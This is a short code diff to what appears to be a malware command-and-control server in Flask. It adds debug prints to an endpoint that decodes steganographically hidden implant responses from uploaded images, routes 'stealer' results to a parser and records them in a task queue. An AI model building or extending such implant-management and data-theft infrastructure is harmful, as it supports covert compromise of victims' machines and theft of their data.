@@ -240,8 +240,13 @@ def display_implants():
 @app.route("/response", methods=["POST"])
 def handle_response():
     try:
+        
         file = request.files['file']
+        print()
+        print("response:")
+        print(file.name)
         string_rep = Steganography.decode(Steganography.iio.imread(file))
+        print(string_rep)
         data = json.loads(string_rep)
         target_implant_id = data['target_implant_id']
         task_id = data['task_id']
@@ -249,12 +254,16 @@ def handle_response():
         success = data['success']
         command = data['command']
 
+        print("checking command: " + command)
         if "stealer" in command: 
             # TODO call Wyatt's function 
             response_data = WyattWonderland.parsejson(response_data)
             
+        print("Querying now")
         # DUMP BACK INTO TASK_QUEUE 
         query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"
+
+        print("succesful")
         time = datetime.now()
         tools.executeGenericVar(query, [response_data, success, time, task_id])
 
